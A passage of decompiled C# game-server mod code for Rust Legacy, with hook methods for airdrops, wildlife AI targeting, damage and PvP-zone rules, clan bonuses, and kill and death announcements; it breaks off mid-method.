		public static void SupplyDropZone_CallAirDropAt(Vector3 pos)
		{
			object[] array = Main.Array(1);
			array[0] = pos;
			if (Main.Call("OnAirdrop", array) == null)
			{
				SupplyDropPlane component = NetCull.LoadPrefab("C130").GetComponent<SupplyDropPlane>();
				float d = 20f * component.maxSpeed;
				Vector3 vector = pos + SupplyDropZone.RandomDirectionXZ() * d;
				Vector3 vector2 = pos + new Vector3(0f, 300f, 0f);
				vector += new Vector3(0f, 400f, 0f);
				UnityEngine.Quaternion quaternion = UnityEngine.Quaternion.LookRotation((vector2 - vector).normalized);
				NetCull.InstantiateClassic("C130", vector, quaternion, 0).GetComponent<SupplyDropPlane>().SetDropTarget(vector2);
			}
		}

		public static void SupplyDropPlane_DoNetwork(SupplyDropPlane hook)
		{
			try
			{
				hook.DoMovement();
				object[] args = new object[]
				{
					hook.transform.position,
					hook.transform.rotation
				};
				hook.networkView.RPC("GetNetworkUpdate", uLink.RPCMode.OthersExceptOwner, args);
			}
			catch (Exception)
			{
			}
		}

		public static void SupplyDropPlane_TargetReached(SupplyDropPlane hook)
		{
			if (!hook.droppedPayload)
			{
				hook.droppedPayload = true;
				float num = 0f;
				int min = Core.Airdrop ? Core.AirdropDrops[0] : 1;
				int num2 = Core.Airdrop ? Core.AirdropDrops[1] : hook.TEMP_numCratesToDrop;
				int num3 = UnityEngine.Random.Range(min, num2 + 1);
				if (num3 > 0)
				{
					for (int i = 0; i < num3; i++)
					{
						hook.Invoke("DropCrate", num);
						num += UnityEngine.Random.Range(0.3f, 0.6f);
					}
				}
				hook.targetPos += hook.transform.forward * hook.maxSpeed * 30f;
				hook.targetPos.y = hook.targetPos.y + 800f;
				hook.Invoke("NetDestroy", 20f);
			}
		}

		protected static bool HostileAI_CanAttack(TakeDamage target)
		{
			bool flag;
			if (target == null)
			{
				flag = false;
			}
			else
			{
				Character component = target.GetComponent<Character>();
				if (component != null && component.playerClient != null)
				{
					if (component.netUser.admin)
					{
						flag = false;
						return flag;
					}
					UserData bySteamID = Users.GetBySteamID(component.playerClient.userID);
					if (bySteamID != null && bySteamID.Zone != null && bySteamID.Zone.Safe)
					{
						flag = false;
						return flag;
					}
				}
				flag = true;
			}
			return flag;
		}

		public static void HostileWildlifeAI_Scent(HostileWildlifeAI AI, TakeDamage damage)
		{
			if (!AI.IsScentBlind() && AI._state != 2 && AI._state != 7 && !AI.HasTarget())
			{
				AI.ExitCurrentState();
				if (RustHook.HostileAI_CanAttack(damage))
				{
					AI.SetAttackTarget(damage);
					AI.EnterState_Chase();
				}
			}
		}

		public static void HostileWildlifeAI_StateSim_Attack(HostileWildlifeAI AI, ulong millis)
		{
			if (!AI.HasTarget() || !RustHook.HostileAI_CanAttack(AI._targetTD))
			{
				AI.LoseTarget();
			}
			else if (!(AI._targetTD.transform == null))
			{
				Vector3 position = AI._targetTD.transform.position;
				Vector3 vector = AI._targetTD.transform.position - AI.transform.position;
				vector.y = 0f;
				AI._wildMove.SetLookDirection(vector.normalized);
				if (AI.nextAttackClock.IntegrateTime_Reached(millis))
				{
					AI.nextAttackClock.ResetDurationSeconds((double)AI.attackRate);
					AI.attackStrikeClock.ResetDurationSeconds(0.25);
					AI.NetworkSound(BasicWildLifeAI.AISound.Attack);
					AI.networkView.RPC("CL_Attack", uLink.RPCMode.OthersExceptOwner, new object[0]);
				}
				if (AI.attackStrikeClock.IntegrateTime_Reached(millis))
				{
					float melee = UnityEngine.Random.Range(AI.attackDamageMin, AI.attackDamageMax);
					DamageEvent damageEvent;
					TakeDamage.Hurt(AI.GetComponent<IDMain>(), AI._targetTD.idMain, new DamageTypeList(0f, 0f, melee, 0f, 0f, 0f), out damageEvent, null);
					AI.attackStrikeClock.ResetDurationSeconds((double)(AI.attackRate * 2f));
				}
				if (AI.TargetRange() > AI.attackRangeMax)
				{
					AI.ExitCurrentState();
					AI.EnterState_Chase();
				}
			}
		}

		public static void HostileWildlifeAI_OnHurt(HostileWildlifeAI AI, DamageEvent damage)
		{
			if (!AI.HasTarget() && damage.attacker.character != null)
			{
				TakeDamage component = damage.attacker.character.gameObject.GetComponent<TakeDamage>();
				if (RustHook.HostileAI_CanAttack(component))
				{
					AI.SetAttackTarget(component);
					AI.ExitCurrentState();
					AI.EnterState_Chase();
				}
			}
		}

		public static bool TakeDamage_HurtShared(TakeDamage take, ref DamageEvent damage, TakeDamage.Quantity quantity)
		{
			Predicate<EventTimer> predicate = null;
			Predicate<EventTimer> predicate2 = null;
			Predicate<EventTimer> predicate3 = null;
			RustHook.Class46 @class = new RustHook.Class46();
			bool flag;
			if (take.dead)
			{
				flag = true;
			}
			else
			{
				bool flag2 = !(damage.victim.idMain is Character);
				bool flag3 = !(damage.attacker.idMain is Character);
				TakeDamage takeDamage = flag2 ? damage.victim.idMain.GetLocal<TakeDamage>() : ((Character)damage.victim.idMain).takeDamage;
				if (!flag3)
				{
					TakeDamage takeDamage2 = ((Character)damage.attacker.idMain).takeDamage;
				}
				else
				{
					damage.attacker.idMain.GetLocal<TakeDamage>();
				}
				WorldZone worldZone = Zones.Get(damage.victim.idMain.transform.position);
				WorldZone worldZone2 = Zones.Get(damage.attacker.idMain.transform.position);
				WeaponImpact weaponImpact = damage.extraData as WeaponImpact;
				if (flag2 && flag3 && damage.victim.idMain == damage.attacker.idMain)
				{
					if (damage.amount == 3.40282347E+38f)
					{
						flag = true;
					}
					else
					{
						if (!Core.DecayObjects)
						{
							damage.amount = 0f;
							if (server.log > 2)
							{
								UnityEngine.Debug.Log("Object: " + Helper.NiceName(takeDamage.name) + " without a decay, because DecayObjects is disabled in config.");
							}
						}
						DeployableObject component = takeDamage.GetComponent<DeployableObject>();
						if (component != null && Users.HasFlag(component.ownerID, UserFlags.admin))
						{
							damage.amount = 0f;
							if (server.log > 2)
							{
								UnityEngine.Debug.Log("Object: " + Helper.NiceName(takeDamage.name) + " without a decay, because owner is administrator.");
							}
						}
						StructureComponent component2 = takeDamage.GetComponent<StructureComponent>();
						if (component2 != null && Users.HasFlag(component2._master.ownerID, UserFlags.admin))
						{
							damage.amount = 0f;
							if (server.log > 2)
							{
								UnityEngine.Debug.Log("Object: " + Helper.NiceName(takeDamage.name) + " without a decay, because owner is administrator.");
							}
						}
						if (worldZone != null && worldZone.Flags.Has(ZoneFlags.nodecay))
						{
							damage.amount = 0f;
							if (server.log > 2)
							{
								UnityEngine.Debug.Log("Object: " + Helper.NiceName(takeDamage.name) + " without a decay, because zone have NoDecay flag.");
							}
						}
						flag = true;
					}
				}
				else
				{
					@class.playerClient_0 = damage.victim.client;
					PlayerClient client = damage.attacker.client;
					Metabolism component3 = damage.victim.id.GetComponent<Metabolism>();
					damage.attacker.id.GetComponent<Metabolism>();
					HumanBodyTakeDamage component4 = damage.victim.id.GetComponent<HumanBodyTakeDamage>();
					damage.attacker.id.GetComponent<HumanBodyTakeDamage>();
					string text = "";
					ulong num = 0uL;
					if (damage.victim.client)
					{
						num = damage.victim.client.userID;
					}
					if (damage.victim.idMain is DeployableObject)
					{
						num = (damage.victim.idMain as DeployableObject).ownerID;
					}
					if (damage.victim.idMain is StructureComponent)
					{
						num = (damage.victim.idMain as StructureComponent)._master.ownerID;
					}
					string text2 = "";
					ulong num2 = 0uL;
					if (damage.attacker.client)
					{
						num2 = damage.attacker.client.userID;
					}
					if (damage.attacker.idMain is DeployableObject)
					{
						num2 = (damage.attacker.idMain as DeployableObject).ownerID;
					}
					if (damage.attacker.idMain is StructureComponent)
					{
						num2 = (damage.attacker.idMain as StructureComponent)._master.ownerID;
					}
					string text3 = "";
					if (weaponImpact != null)
					{
						text3 = weaponImpact.dataBlock.name;
					}
					float num3 = Vector3.Distance(damage.attacker.id.transform.position, damage.victim.id.transform.position);
					UserData userData = (num != 0uL) ? Users.GetBySteamID(num) : null;
					UserData userData2 = (num2 != 0uL) ? Users.GetBySteamID(num2) : null;
					ClanData clanData = (userData != null) ? userData.Clan : null;
					ClanData clanData2 = (userData2 != null) ? userData2.Clan : null;
					if (damage.victim.client && !flag2 && userData != null && userData.HasFlag(UserFlags.godmode))
					{
						if (component4 != null && component4._bleedingLevel > 0f)
						{
							component4.Bandage(1000f);
						}
						damage.amount = 0f;
						flag = false;
					}
					else
					{
						if (client != null && userData != null && userData2 != null && userData != userData2)
						{
							if (!flag3 || !(damage.attacker.idMain is DeployableObject))
							{
								if (clanData2 != null && clanData != null && clanData2 == clanData && userData.Clan.Flags.Has(ClanFlags.can_ffire) && userData.Clan.FrendlyFire && (worldZone == null || !worldZone.Flags.Has(ZoneFlags.events)))
								{
									string message = Config.GetMessage(flag2 ? "Player.NoDamage.ClanMemberOwned" : "Player.NoDamage.ClanMember", client.netUser, null);
									Broadcast.Notice(client.netUser, "☢", message.Replace("%KILLER%", userData2.Username).Replace("%VICTIM%", userData.Username), 5f);
									damage.amount = 0f;
									flag = false;
									return flag;
								}
								if (userData2.HasFlag(UserFlags.nopvp) || userData.HasFlag(UserFlags.nopvp))
								{
									string message2 = Config.GetMessage(flag2 ? "Player.NoDamage.WithoutPvPOwned" : "Player.NoDamage.WithoutPvP", client.netUser, null);
									Broadcast.Notice(client.netUser, "☢", message2.Replace("%KILLER%", userData2.Username).Replace("%VICTIM%", userData.Username), 5f);
									damage.amount = 0f;
									flag = false;
									return flag;
								}
								if (userData2.Zone != null && (userData2.Zone.NoPvP || userData2.Zone.Safe))
								{
									string message3 = Config.GetMessage(flag2 ? "Player.NoDamage.ZoneWithoutPvPOwned" : "Player.NoDamage.ZoneWithoutPvP", client.netUser, null);
									Broadcast.Notice(client.netUser, "☢", message3.Replace("%KILLER%", userData2.Username).Replace("%VICTIM%", userData.Username), 5f);
									damage.amount = 0f;
									flag = false;
									return flag;
								}
							}
							WorldZone worldZone3 = flag2 ? Zones.Get(damage.victim.idMain.transform.position) : userData.Zone;
							if (worldZone3 != null && (worldZone3.NoPvP || worldZone3.Safe))
							{
								string message4 = Config.GetMessage(flag2 ? "Player.NoDamage.ZoneWithSafetyOwned" : "Player.NoDamage.ZoneWithSafety", client.netUser, null);
								Broadcast.Notice(client.netUser, "☢", message4.Replace("%KILLER%", userData2.Username).Replace("%VICTIM%", userData.Username), 5f);
								damage.amount = 0f;
								flag = false;
								return flag;
							}
						}
						if (damage.attacker.client && damage.attacker.client.netUser.admin && Core.AdminInstantDestory)
						{
							if (weaponImpact != null)
							{
								weaponImpact.item.SetCondition(weaponImpact.item.maxcondition);
							}
							damage.amount = float.PositiveInfinity;
						}
						else if (!Override.DamageOverride(take, ref damage, ref quantity))
						{
							damage.amount = 0f;
							flag = false;
							return flag;
						}
						object[] array = Main.Array(2);
						array[0] = take;
						array[1] = damage;
						object obj = Main.Call("OnProcessDamageEvent", array);
						if (obj is DamageEvent)
						{
							damage = (DamageEvent)obj;
						}
						if (flag3)
						{
							text2 = Helper.NiceName(damage.attacker.idMain.name);
						}
						else if (damage.attacker.client)
						{
							text2 = damage.attacker.client.userName;
							if (clanData2 != null && clanData2.Level.BonusMembersDamage > 0u)
							{
								damage.amount += damage.amount * clanData2.Level.BonusMembersDamage / 100f;
							}
							if (server.pvp && !flag2 && damage.amount >= takeDamage.health && damage.victim.id != damage.attacker.id)
							{
								string text4;
								if (damage.victim.client)
								{
									text = damage.victim.client.userName;
									text4 = Config.GetMessageMurder("PlayerNotice.Murder", client.netUser, text, null);
									if (text4.Equals("PlayerNotice.Murder", StringComparison.CurrentCultureIgnoreCase))
									{
										text4 = "";
									}
								}
								else
								{
									text = Helper.NiceName(damage.victim.character.name);
									Config.Get("NAMES." + ((userData2 == null) ? Core.Languages[0] : userData2.Language), text, ref text, true);
									text4 = Config.GetMessageMurder("PlayerNotice.NPC", client.netUser, text, null);
									if (text4.Equals("PlayerNotice.NPC", StringComparison.CurrentCultureIgnoreCase))
									{
										text4 = "";
									}
								}
								if (Core.AnnounceKillNotice && text4 != "")
								{
									if (text3 != "")
									{
										text4 = text4.Replace("%WEAPON%", text3);
									}
									DamageTypeFlags damageTypes = damage.damageTypes;
									switch (damageTypes)
									{
									case DamageTypeFlags.damage_generic:
										text4 = text4.Replace("%WEAPON%", "Melee");
										break;
									case DamageTypeFlags.damage_bullet:
										if (weaponImpact != null)
										{
											text4 = text4.Replace("%WEAPON%", text3);
										}
										break;
									case DamageTypeFlags.damage_generic | DamageTypeFlags.damage_bullet:
										break;
									case DamageTypeFlags.damage_melee:
										if (weaponImpact == null)
										{
											text3 = "流血";
										}
										text4 = text4.Replace("%WEAPON%", text3);
										break;
									default:
										if (damageTypes == DamageTypeFlags.damage_explosion)
										{
											if (damage.attacker.id.name.StartsWith("F1Grenade"))
											{
												text3 = "F1 Grenade";
											}
											if (damage.attacker.id.name.StartsWith("ExplosiveCharge"))
											{
												text3 = "Explosive Charge";
											}
											text4 = text4.Replace("%WEAPON%", text3);
										}
										break;
									}
									string niceName = BodyParts.GetNiceName(damage.bodyPart);
									Config.Get("BODYPART." + ((userData2 == null) ? Core.Languages[0] : userData2.Language), niceName, ref niceName, true);
									text4 = text4.Replace("%BODYPART%", niceName);
									text4 = text4.Replace("%DISTANCE%", num3.ToString("N1"));
									text4 = text4.Replace("%DAMAGE%", damage.amount.ToString("0.0"));
									Broadcast.Notice(client.netUser, "☠", text4, 2.5f);
								}
							}
						}
						else
						{
							text2 = Helper.NiceName(damage.attacker.character.name);
							Config.Get("NAMES." + ((userData == null) ? Core.Languages[0] : userData.Language), text2, ref text2, true);
						}
						if (flag2)
						{
							text = Helper.NiceName(damage.victim.idMain.name);
							if (client != null && client.netUser.admin && damage.amount >= takeDamage.health)
							{
								Helper.Log(Config.GetMessageObject("PlayerOwnership.Logger.Destroyed", text, client, text3, userData), false);
								flag = true;
								return flag;
							}
							if (num2 != num && userData != null && userData2 != null && userData.HasFlag(UserFlags.admin) && !userData2.HasFlag(UserFlags.admin))
							{
								damage.amount = 0f;
								flag = false;
								return flag;
							}
							if (Core.loutijz)
							{
								if (text.IndexOf("Stairs") != -1 || text.IndexOf("Ceiling") != -1)
								{
									damage.amount = 0f;
									if (client != null)
									{
										Broadcast.Notice(client.netUser, "☠", "此服务器不支持拆除楼梯和天花板建筑！", 1.5f);
									}
									flag = false;
									return flag;
								}
							}
							if (num != num2 && Core.OwnershipAttackedAnnounce)
							{
								NetUser netUser = NetUser.FindByUserID(num);
								Config.Get("NAMES." + ((userData == null) ? Core.Languages[0] : userData.Language), text, ref text, true);
								if (Core.OwnershipAttackedPremiumOnly && !Users.HasFlag(num, UserFlags.premium))
								{
									netUser = null;
								}
								if (netUser != null && damage.amount != 0f)
								{
									if (damage.amount >= takeDamage.health)
									{
										Broadcast.Message(netUser, Config.GetMessageObject("PlayerOwnership.Object.Destroyed", text, client, text3, userData), null, 1f);
									}
									else
									{
										Broadcast.Message(netUser, Config.GetMessageObject("PlayerOwnership.Object.Attacked", text, client, text3, userData), null, 1f);
									}
								}
							}
							else if ((num == num2 || Users.SharedGet(num, num2)) && (Core.OwnershipDestroy || Core.DestoryOwnership.ContainsKey(client.userID)))
							{
								StructureComponent component5 = damage.victim.idMain.GetComponent<StructureComponent>();
								if (!Core.OwnershipDestroyNoCarryWeight || component5 == null || !component5._master.ComponentCarryingWeight(component5))
								{
									if (damage.amount == 0f && damage.attacker.id is TimedGrenade)
									{
										damage.amount = (damage.attacker.id as TimedGrenade).damage;
									}
									if (damage.amount == 0f && damage.attacker.id is TimedExplosive)
									{
										damage.amount = (damage.attacker.id as TimedExplosive).damage;
									}
									if (damage.amount == 0f && weaponImpact != null)
									{
										damage.amount = UnityEngine.Random.Range(weaponImpact.dataBlock.damageMin, weaponImpact.dataBlock.damageMax);
									}
									if (damage.amount == 0f && weaponImpact == null)
									{
										damage.amount = (float)UnityEngine.Random.Range(75, 75);
									}
									if (Core.OwnershipDestroyInstant)
									{
										damage.amount = float.PositiveInfinity;
										if (damage.victim.idMain.GetComponent<SpikeWall>() != null)
										{
											damage.damageTypes = DamageTypeFlags.damage_generic;
										}
									}
								}
								if (damage.amount >= takeDamage.health)
								{
									bool xzjz = Core.xzjz;
									ulong ownerID = component5._master.ownerID;
									if (xzjz && component5.name.IndexOf("Foundation") != -1)
									{
										string setting = RustHook.dijiusers.GetSetting(ownerID.ToString(), "diji");
										int num4 = 1;
										if (setting != "" && setting != null)
										{
											num4 = Convert.ToInt32(setting);
											num4--;
										}
										if (num4 <= 0)
										{
											num4 = 0;
										}
										RustHook.dijiusers.AddSetting(ownerID.ToString(), "diji", num4.ToString());
									}
									if (Core.OwnershipDestroyReceiveResources)
									{
										string key = damage.victim.idMain.name.Replace("(Clone)", "");
										if (Core.DestoryResources.ContainsKey(key))
										{
											string[] array2 = Core.DestoryResources[key].Split(new char[]
											{
												','
											});
											string[] array3 = array2;
											for (int i = 0; i < array3.Length; i++)
											{
												string input = array3[i];
												string[] array4 = Facepunch.Utility.String.SplitQuotesStrings(input);
												if (array4.Length < 2)
												{
													array4 = new string[]
													{
														"1",
														array4[0]
													};
												}
												ItemDataBlock byName = DatablockDictionary.GetByName(array4[1]);
												if (byName != null)
												{
													string text5 = byName.name;
													int num5 = 1;
													if (!int.TryParse(array4[0], out num5))
													{
														num5 = 1;
													}
													if (num5 > 0)
													{
														text5 = num5 + " " + text5;
													}
													Helper.GiveItem(client, byName, num5, -1);
													Config.Get("NAMES." + ((userData2 == null) ? Core.Languages[0] : userData2.Language), text, ref text, true);
													Broadcast.Message(client.netUser, Config.GetMessage("Command.Destroy.ResourceReceived", client.netUser, null).Replace("%ITEMNAME%", text5).Replace("%OBJECT%", text), null, 0f);
												}
												else
												{
													Helper.Log(string.Format("Resource {0} not exist for receive after destroy {1}.", array4[1], text), false);
												}
											}
										}
										else
										{
											Helper.Log("Resources not found for object '" + text + "' to receive for player.", false);
										}
									}
									Helper.Log(Config.GetMessageObject("PlayerOwnership.Logger.Destroyed", text, client, text3, userData), false);
								}
							}
						}
						else if (damage.victim.client)
						{
							if (clanData != null && clanData.Level.BonusMembersDefense > 0u)
							{
								damage.amount -= damage.amount * clanData.Level.BonusMembersDefense / 100f;
							}
							List<EventTimer> timer = Events.Timer;
							if (predicate == null)
							{
								predicate = new Predicate<EventTimer>(@class.method_0);
							}
							EventTimer eventTimer = timer.Find(predicate);
							if (eventTimer != null)
							{
								Broadcast.Notice(@class.playerClient_0.netUser, "☢", Config.GetMessageCommand("Command.Home.Interrupt", "", client.netUser), 5f);
								eventTimer.Dispose();
								Events.Timer.Remove(eventTimer);
							}
							List<EventTimer> timer2 = Events.Timer;
							if (predicate2 == null)
							{
								predicate2 = new Predicate<EventTimer>(@class.method_1);
							}
							EventTimer eventTimer2 = timer2.Find(predicate2);
							if (eventTimer2 != null)
							{
								Broadcast.Notice(@class.playerClient_0.netUser, "☢", Config.GetMessageCommand("Command.Clan.Warp.Interrupt", "", client.netUser), 5f);
								eventTimer2.Dispose();
								Events.Timer.Remove(eventTimer2);
							}
							List<EventTimer> timer3 = Events.Timer;
							if (predicate3 == null)
							{
								predicate3 = new Predicate<EventTimer>(@class.method_2);
							}
							EventTimer eventTimer3 = timer3.Find(predicate3);
							if (eventTimer3 != null)
							{
								if (eventTimer3.Sender != null)
								{
									Broadcast.Notice(eventTimer3.Sender.networkPlayer, "☢", Config.GetMessageCommand("Command.Teleport.Interrupt", "", client.netUser), 5f);
								}
								if (eventTimer3.Target != null)
								{
									Broadcast.Notice(eventTimer3.Target.networkPlayer, "☢", Config.GetMessageCommand("Command.Teleport.Interrupt", "", client.netUser), 5f);
								}
								eventTimer3.Dispose();
								Events.Timer.Remove(eventTimer3);
							}
							if (!server.pvp && @class.playerClient_0 != null && client != null && @class.playerClient_0 != client)
							{
								flag = false;
								return flag;
							}
							if (damage.amount >= takeDamage.health)
							{
								if (userData != null)
								{
									foreach (string current in Users.PersonalList(userData.SteamID).Keys.ToList<string>())
									{
										if (Users.PersonalList(userData.SteamID)[current] == 0)
										{
											Users.PersonalRemove(userData.SteamID, current);
										}
										else
										{
											Dictionary<string, int> dictionary;
											string key2;
											(dictionary = Users.PersonalList(userData.SteamID))[key2 = current] = dictionary[key2] - 1;
											Users.SQL_UpdatePersonal(userData.SteamID);
										}
									}
								}
								string text6 = "";
								bool flag4 = false;
								if (client == null)
								{
									flag4 = Core.AnnounceDeathNPC;
									text6 = Config.GetMessageDeath("PlayerDeath.NPC", @class.playerClient_0.netUser, text2, null);
								}
								else if (!(@class.playerClient_0 == client) && !flag3)
								{
									if (@class.playerClient_0 != client)
									{
										flag4 = Core.AnnounceDeathMurder;
										text6 = Config.GetMessageDeath("PlayerDeath.Murder", @class.playerClient_0.netUser, text2, null);
										if ((worldZone2 == null || !worldZone2.Flags.Has(ZoneFlags.events)) && (worldZone == null || !worldZone.Flags.Has(ZoneFlags.events)) && !flag2 && userData != null && userData2 != null && clanData2 != null && client != null)
										{
											float num6 = 0f;
											if (userData != null)
											{
												if (clanData == null)
												{
													num6 = Math.Abs(50f * Clans.ExperienceMultiplier);
												}
												else if (clanData2.Hostile.ContainsKey(clanData.ID))
												{
													num6 = Math.Abs(250f * Clans.ExperienceMultiplier);
													if (Clans.ClanWarDeathPay)
													{
														clanData2.Balance += clanData.Balance * (ulong)Clans.ClanWarDeathPercent / 100uL;
													}
													if (Clans.ClanWarMurderFee)
													{
														clanData.Balance -= clanData.Balance * (ulong)Clans.ClanWarMurderPercent / 100uL;
													}
												}
												else if (clanData != clanData2)
												{
													num6 = Math.Abs(100f * Clans.ExperienceMultiplier);
												}
											}
											if (num6 >= 0f)
											{
												if (num6 >= 1f)
												{
													clanData2.Experience += (ulong)num6;
													if (clanData2.Members[userData2].Has(ClanMemberFlags.expdetails))
													{
														Broadcast.Message(client.netPlayer, Config.GetMessage("Clan.Experience.Murder", client.netUser, null).Replace("%EXPERIENCE%", num6.ToString("N0")).Replace("%VICTIM%", userData.Username), null, 0f);
													}
												}
											}
										}
									}
								}
								else
								{
									flag4 = Core.AnnounceDeathSelf;
									text6 = Config.GetMessageDeath("PlayerDeath.Suicide", @class.playerClient_0.netUser, null, null);
								}
								if (damage.damageTypes == (DamageTypeFlags)0)
								{
									if (component4 != null && component4.IsBleeding())
									{
										text6 = Config.GetMessageDeath("PlayerDeath.Bleeding", @class.playerClient_0.netUser, null, null);
									}
									else if (component3 != null && component3.HasRadiationPoisoning())
									{
										text6 = Config.GetMessageDeath("PlayerDeath.Radiation", @class.playerClient_0.netUser, null, null);
									}
									else if (component3 != null && component3.IsPoisoned())
									{
										text6 = Config.GetMessageDeath("PlayerDeath.Poison", @class.playerClient_0.netUser, null, null);
									}
									else if (component3 != null && component3.GetCalorieLevel() <= 0f)
									{
										text6 = Config.GetMessageDeath("PlayerDeath.Hunger", @class.playerClient_0.netUser, null, null);
									}
									else if (component3 != null && component3.IsCold())
									{
										text6 = Config.GetMessageDeath("PlayerDeath.Cold", @class.playerClient_0.netUser, null, null);
									}
									else
									{
										text6 = Config.GetMessageDeath("PlayerDeath.Bleeding", @class.playerClient_0.netUser, null, null);
									}
								}
								else
								{
									DamageTypeFlags damageTypes = damage.damageTypes;
									switch (damageTypes)
									{
									case DamageTypeFlags.damage_generic:
										text6 = text6.Replace("%WEAPON%", "Melee");
										break;
									case DamageTypeFlags.damage_bullet:
										if (weaponImpact != null)
										{
											text6 = text6.Replace("%WEAPON%", text3);
										}
										break;
									case DamageTypeFlags.damage_generic | DamageTypeFlags.damage_bullet:
										break;
									case DamageTypeFlags.damage_melee:
										if (weaponImpact == null)
										{
											text3 = "Hunting Bow";
										}
										text6 = text6.Replace("%WEAPON%", text3);
										break;
									default:
										if (damageTypes == DamageTypeFlags.damage_explosion)
										{
											if (damage.attacker.id.name.StartsWith("F1Grenade"))
											{
												text3 = "F1 Grenade";
											}
											if (damage.attacker.id.name.StartsWith("ExplosiveCharge"))
											{
												text3 = "Explosive Charge";
											}
											text6 = text6.Replace("%WEAPON%", text3);
										}
										break;
									}
									string niceName2 = BodyParts.GetNiceName(damage.bodyPart);
									Config.Get("BODYPART." + Core.Languages[0], niceName2, ref niceName2, true);
									text6 = text6.Replace("%BODYPART%", niceName2);
									text6 = text6.Replace("%DISTANCE%", num3.ToString("N1"));
									text6 = text6.Replace("%DAMAGE%", damage.amount.ToString("0.0"));
								}
								if (flag4)
								{
									Broadcast.MessageAll(text6);
								}
								Helper.LogChat(text6, false);
							}
						}
						else
						{
							text = Helper.NiceName(damage.victim.character.name);
							if ((worldZone2 == null || !worldZone2.Flags.Has(ZoneFlags.events)) && (worldZone == null || !worldZone.Flags.Has(ZoneFlags.events)) && damage.amount >= takeDamage.health && userData2 != null && userData2.Clan != null)
							{
								float num7 = 0f;
								if (text.Equals("Chicken", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(1f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Rabbit", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(1f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Boar", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(3f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Stag", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(5f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Wolf", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(10f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Bear", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(20f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Mutant Wolf", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(15f * Clans.ExperienceMultiplier);
								}
								else if (text.Equals("Mutant Bear", StringComparison.OrdinalIgnoreCase))
								{
									num7 = Math.Abs(30f * Clans.ExperienceMultiplier);
								}
								else
								{
									ConsoleSystem.LogWarning("[WARNING] Creature '" + text + "' not have experience for death.");
								}
								Config.Get("NAMES." + ((userData2 == null) ? Core.Languages[0] : userData2.Language), text, ref text, true);
								if (num7 >= 0f)
								{
									if (num7 >= 1f)
									{
										userData2.Clan.Experience += (ulong)num7;
										if (userData2.Clan.Members[userData2].Has(ClanMemberFlags.expdetails))
										{
											Broadcast.Message(client.netPlayer, Config.GetMessage("Clan.Experience.Murder", client.netUser, null).Replace("%EXPERIENCE%", num7.ToString("N0")).Replace("%VICTIM%", text), null, 0f);
										}
									}
								}
							}
						}
						if (damage.damageTypes != (DamageTypeFlags)0 && damage.amount != 0f && !Core.OverrideDamage && (!float.IsInfinity(damage.amount) || !(damage.attacker.id == damage.victim.id)))
						{
							if (damage.attacker.id is SpikeWall)
							{
								string text7 = (damage.attacker.id as SpikeWall).baseReturnDmg.ToString();
								Helper.Log(string.Concat(new object[]
								{
									"Damage: ",
									damage.attacker,
									" owned ",
									damage.attacker.client,
									" hit ",
									damage.victim.idMain,
									"[",
									damage.victim.networkViewID,
									"] on ",
									damage.amount,
									"(",
									text7,
									") pts."
								}), false);
							}
							else if (damage.attacker.id is TimedGrenade)
							{
								string text7 = (damage.attacker.id as TimedGrenade).damage.ToString();
								Helper.Log(string.Concat(new object[]
								{
									"Damage: ",
									damage.attacker,
									" owned ",
									damage.attacker.client,
									" hit ",
									damage.victim.idMain,
									"[",
									damage.victim.networkViewID,
									"] on ",
									damage.amount,
									"(",
									text7,
									") pts."
								}), false);
							}
							else if (damage.attacker.id is TimedExplosive)
							{
								string text7 = (damage.attacker.id as TimedExplosive).damage.ToString();
								Helper.Log(string.Concat(new object[]
								{
									"Damage: ",
									damage.attacker,
									" owned ",
									damage.attacker.client,
									" hit ",
									damage.victim.idMain,
									"[",
									damage.victim.networkViewID,
									"] on ",
									damage.amount,
									"(",
									text7,
									") pts."
								}), false);
							}
							else if (damage.attacker.client && weaponImpact != null)
							{
								string text7 = weaponImpact.dataBlock.damageMin + "-" + weaponImpact.dataBlock.damageMax;
								Helper.Log(string.Concat(new object[]
								{
									"Damage: ",
									damage.attacker,
									"[",
									damage.attacker.networkViewID,
									"] from ",
									weaponImpact.dataBlock.name,
									" hit ",
									damage.victim.idMain,
									"[",
									damage.victim.networkViewID,
									"] on ",
									damage.amount,
									"(",
									text7,
									") pts."
								}), false);
							}
							else if (damage.attacker.client && weaponImpact == null)
							{
								string text7 = "75";
								Helper.Log(string.Concat(new object[]
								{
									"Damage: ",
									damage.attacker,
									"[",
									damage.attacker.networkViewID,
									"] from Hunting Bow hit ",
									damage.victim.idMain,
									"[",
									damage.victim.networkViewID,
									"] on ",
									damage.amount,
									"(",
									text7,
									") pts."
								}), false);
							}
						}
						if ((worldZone2 == null || !worldZone2.Flags.Has(ZoneFlags.events)) && (worldZone == null || !worldZone.Flags.Has(ZoneFlags.events)) && Economy.Enabled && !flag2 && damage.amount >= takeDamage.health)
						{
							Economy.HurtKilled(damage);
						}
						flag = true;
					}
				}
			}
			return flag;
		}

		public static void DeathTransfer_SetDeathReason(PlayerClient player, ref DamageEvent damage)
		{
			if (!(player == null) && NetCheck.PlayerValid(player.netPlayer))
			{
				IDMain idMain = damage.attacker.idMain;
				if (idMain != null)
				{
					idMain = idMain.idMain;
				}
				if (idMain is Character)
				{
					Character character = idMain as Character;
					Controller playerControlledController = character.playerControlledController;
					if (playerControlledController != null)
					{
						if (playerControlledController.playerClient == player)
						{
							DeathScreen.SetReason(player.netPlayer, "你自杀了.");
						}
						else
						{
							WeaponImpact weaponImpact = damage.extraData as WeaponImpact;
							if (weaponImpact != null)
							{
								DeathScreen.SetReason(player.netPlayer, string.Concat(new string[]
								{
									playerControlledController.playerClient.userName,
									" 杀了你使用的是 ",
									weaponImpact.dataBlock.name,
									" 一击到你 ",
									BodyParts.GetNiceName(damage.bodyPart)
								}));
							}
							else
							{
